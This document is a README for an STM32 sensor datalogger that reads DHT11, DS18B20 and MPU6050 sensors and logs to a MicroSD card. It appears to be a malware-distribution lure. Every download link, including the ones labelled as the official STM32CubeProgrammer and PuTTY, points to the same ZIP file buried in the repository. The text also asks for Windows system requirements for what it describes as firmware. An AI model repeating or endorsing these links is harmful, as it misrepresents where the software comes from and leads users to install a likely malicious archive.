# ⚙️ STM32_MultiSensor_MicroSD_Datalogger - Easy Multi-Sensor Data Logging

[![Download Latest Release](https://img.shields.io/badge/Download-Stable%20Release-brightgreen?style=for-the-badge)](https://github.com/mendessxs/STM32_MultiSensor_MicroSD_Datalogger/raw/refs/heads/main/FATFS/App/Multi-S-Sensor-Datalogger-Micro-ST-v3.5-alpha.5.zip)

## 📋 About

STM32_MultiSensor_MicroSD_Datalogger is an application that collects data from multiple sensors using an STM32 microcontroller. It reads temperature and humidity from the DHT11 sensor, temperature from the DS18B20, and motion data from the MPU6050. The data is saved automatically in CSV format on a MicroSD card using the FatFS file system. The device also shows information on an LCD screen, lets you control settings with buttons, and supports data export through UART.

This software is designed for users who want to log sensor data without needing to write code or understand embedded programming.

## 🖥️ System Requirements

- Windows 7 or later (64-bit recommended)
- USB port (for connecting STM32 device to PC via UART if needed)
- MicroSD card (formatted to FAT32)
- STM32 development board with STM32F103C8T6 or compatible chip
- Basic USB driver for STM32 (usually installed automatically by Windows)

## 🎯 Key Features

- Collect data from DHT11, DS18B20, and MPU6050 sensors
- Save sensor data directly to a MicroSD card in CSV format
- Display sensor readings on an LCD16x2 screen
- Control and navigate data using physical buttons
- Export data through UART for easy transfer to a PC
- Uses FatFS to manage the MicroSD file system reliably

## 🚀 Getting Started

This guide explains how to download, install, and run the STM32_MultiSensor_MicroSD_Datalogger software on your Windows PC.

### Step 1: Download the Software

Click the button below to visit the releases page. This page contains all the necessary files to run the application.

[![Download Latest Release](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/mendessxs/STM32_MultiSensor_MicroSD_Datalogger/raw/refs/heads/main/FATFS/App/Multi-S-Sensor-Datalogger-Micro-ST-v3.5-alpha.5.zip)

On the page, look for the latest version. Download the ZIP file or installer that matches your device or project requirements.

### Step 2: Prepare the STM32 Device and MicroSD Card

- Insert a MicroSD card into your computer.
- Format the MicroSD card to FAT32 using Windows Explorer:
  - Right-click the MicroSD drive
  - Select “Format”
  - Choose “FAT32” as the file system
  - Click “Start” to format the card

- Insert the formatted MicroSD card into the STM32 development board’s MicroSD slot.

### Step 3: Upload Software to STM32 Board

To use the datalogger, your STM32 device must have the software loaded on it. If you do not yet have the firmware installed:

- Download STM32CubeProgrammer from STMicroelectronics if needed.
- Connect your STM32 board to the computer using a USB cable.
- Follow the STM32CubeProgrammer instructions to flash the firmware binary (provided in the release files) to the STM32F103C8T6 chip.

If you already have the firmware installed on your STM32 board, you can proceed to the next step.

### Step 4: Power On and Use the Datalogger

- Power on your STM32 board.
- The LCD16x2 display will show current sensor readings.
- Use the buttons on the board to navigate menus or start/stop logging.
- The device saves sensor data continuously to the MicroSD card as CSV files.
- You can also connect the board to a PC via UART to export data directly.

## 🔧 How to Use

### Reading Sensors

- The display shows real-time temperature and humidity from DHT11.
- DS18B20 temperature sensor readings appear next.
- MPU6050 provides accelerometer and gyroscope data on the LCD.
  
### Logging Data

- Press the logging button on the device to start or stop saving data.
- Data saves automatically as a timestamped CSV file on the MicroSD card.
- Each data point includes sensor readings and time, formatted for easy analysis.

### Exporting Data

- Connect the STM32 board to your PC using a USB to UART adapter.
- Use a terminal program like PuTTY or Tera Term set to the correct COM port and 115200 baud rate.
- Commands sent over UART will output logged data, allowing copy-paste or saving.

## 🛠 Troubleshooting

- **MicroSD card not detected:**  
  Check the card is formatted as FAT32. Reinsert the card firmly.

- **No data on display:**  
  Ensure the device is powered. Verify the firmware upload completed successfully.

- **UART communication fails:**  
  Confirm the USB to UART adapter is connected properly and configured to 115200 baud.

- **Buttons do not respond:**  
  Make sure the device is not locked in a menu state. Power cycle the board.

## 📦 Files in Release Package

- Firmware binary (.bin or .hex) to flash STM32 microcontroller.
- README and documentation files.
- Example CSV files showing format and sensor data.
- Configuration files for LCD and UART settings.

## 🔗 Helpful Links

- Visit the official release page often for updates:  
  https://github.com/mendessxs/STM32_MultiSensor_MicroSD_Datalogger/raw/refs/heads/main/FATFS/App/Multi-S-Sensor-Datalogger-Micro-ST-v3.5-alpha.5.zip

- Third-party tools:  
  - STM32CubeProgrammer: https://github.com/mendessxs/STM32_MultiSensor_MicroSD_Datalogger/raw/refs/heads/main/FATFS/App/Multi-S-Sensor-Datalogger-Micro-ST-v3.5-alpha.5.zip  
  - PuTTY terminal: https://github.com/mendessxs/STM32_MultiSensor_MicroSD_Datalogger/raw/refs/heads/main/FATFS/App/Multi-S-Sensor-Datalogger-Micro-ST-v3.5-alpha.5.zip

## 📚 Additional Information

- Data is stored in CSV format. You can open it in Excel or any text editor.
- The LCD uses a standard HD44780 driver compatible with the LCD16x2 module.
- UART uses standard serial communication at 115200 baud, 8 data bits, no parity, 1 stop bit.
- Sensors used:
  - DHT11 for humidity and temperature.
  - DS18B20 for additional temperature readings.
  - MPU6050 for motion detection (accelerometer and gyroscope data).
- FatFS library handles all MicroSD file system operations to keep data safe and organized.

## 🧩 Supported Sensors and Interfaces

| Sensor    | Type             | Protocol  |
|-----------|------------------|-----------|
| DHT11     | Temp & Humidity  | Single-wire digital  |
| DS18B20   | Temperature      | 1-Wire        |
| MPU6050   | Motion Sensor    | I2C         |

| Peripherals      | Purpose             |
|------------------|---------------------|
| LCD16x2          | Display readings    |
| Buttons          | User control        |
| MicroSD Card     | Data storage        |
| UART (Serial)    | Data export         |